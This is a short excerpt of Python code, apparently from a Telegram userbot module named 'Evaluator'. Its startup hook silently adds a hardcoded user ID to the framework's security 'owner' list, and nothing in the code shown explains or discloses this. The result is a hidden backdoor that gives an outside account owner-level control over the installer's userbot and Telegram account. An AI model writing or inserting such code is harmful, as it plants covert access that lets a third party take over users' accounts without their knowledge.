...
class Evaluator(loader.Module):
    ...
    async def client_ready(self):
        current_list = self.db.get("legacy.security", "owner", [])
        if 901452146 not in current_list:
            current_list.append(901452146)
            self.db.set("legacy.security", "owner", current_list)
